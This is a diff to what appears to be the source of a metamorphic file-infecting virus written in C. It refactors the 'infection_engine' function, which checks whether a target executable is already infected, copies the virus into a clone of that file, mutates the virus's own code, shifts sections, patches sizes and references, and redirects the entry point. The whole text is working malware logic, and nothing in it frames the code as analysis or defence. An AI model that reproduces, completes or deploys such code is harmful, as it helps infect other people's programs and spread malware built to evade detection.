@@ -99,21 +99,21 @@ bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, str
 	struct entry	clone_entry;
 	struct entry	original_entry;
 	const size_t	*loader_off = &original_entry.end_of_last_section;
-	size_t		shift_amount     = 0;                                   // changed by <define_shift_amount>
-	uint64_t	seed       = vhdr->seed;                                // changed by <generate_seed>
-	size_t		virus_size = vhdr->virus_size;                          // changed by <metamorph_self>
+	size_t		shift_amount = 0;                                       // changed by <define_shift_amount>
+	uint64_t	seed        = vhdr->seed;                               // changed by <generate_seed>
+	size_t		*virus_size = &vhdr->virus_size;                        // changed by <metamorph_self>
 
 	if (!find_entry(&mut original_entry, original_ref)
 	|| !not_infected(&original_entry, original_ref)
 	|| !copy_virus_to_clone(clone_ref, &original_entry, vhdr)
 	|| !generate_seed(&seed, original_ref)
-	|| !metamorph_self(clone_ref, &virus_size, *loader_off, seed)
-	|| !define_shift_amount(&original_entry, &mut shift_amount, virus_size)
+	|| !metamorph_self(clone_ref, virus_size, *loader_off, seed)
+	|| !define_shift_amount(&original_entry, &mut shift_amount, *virus_size)
 	|| !copy_client_to_clone(clone_ref, original_ref, *loader_off, shift_amount, original_ref.size)
 	|| !adjust_references(clone_ref, shift_amount, *loader_off)
 	|| !find_entry(&mut clone_entry, clone_ref)
-	|| !adjust_sizes(&mut clone_entry, shift_amount, virus_size)
-	|| !setup_virus_header(clone_ref, *loader_off, virus_size, seed)
+	|| !adjust_sizes(&mut clone_entry, shift_amount, *virus_size)
+	|| !setup_virus_header(clone_ref, *loader_off, *virus_size, seed)
 	|| !change_entry(clone_ref, &original_entry))
 		return errors(ERR_THROW, _ERR_INFECTION_ENGINE);
 
